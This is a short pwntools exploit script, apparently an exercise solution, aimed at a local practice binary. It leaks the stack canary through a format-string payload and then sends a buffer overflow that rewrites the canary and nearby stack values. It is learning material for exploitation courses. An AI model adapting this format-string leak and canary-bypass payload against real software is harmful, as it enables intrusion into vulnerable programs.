#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise5a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()
# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()
FORMAT_STRING_OFFSET = 10
BUF_SIZE = 256
# for i in range(0xe3):
#     leak = b'%' + str(i).encode() + b'$p'
#     a = r.recvuntil(b'user 2:\n')
#     r.sendline(leak)
#     leaked = r.recvuntil(b'is not the password\n')
#     print(b'Leak i = ' + str(i).encode() + b': ' + leaked.split(b'is not')[0])

# 42 is the answer to everything as it turns out
leak_payload = b'%' + b'42' + b'$p\x0a'
r.recvuntil(b'user 2:\n')
r.send(leak_payload)
leaked = r.recvuntil(b'is not the password\n')
canary_raw = leaked.split(b'is not')[0]
print(b'Leaked canary: ' + canary_raw)
canary = int(canary_raw, 16)
r.recvuntil(b'user 2:\n')

MAX_LOOP_COUNT = 0xe3

payload = cyclic(BUF_SIZE - 1) + b'\0' # null-terminate for the sake of printf
payload += pack(canary, 32)
payload += pack(0x69, 32)
payload += pack(0x00, 32)
payload += pack(MAX_LOOP_COUNT + 1, 32)
payload += b'\x0a'

r.send(payload)

# Doesn't segfault every time, so set a time limit
a = r.recvall(timeout=3)
print(a)
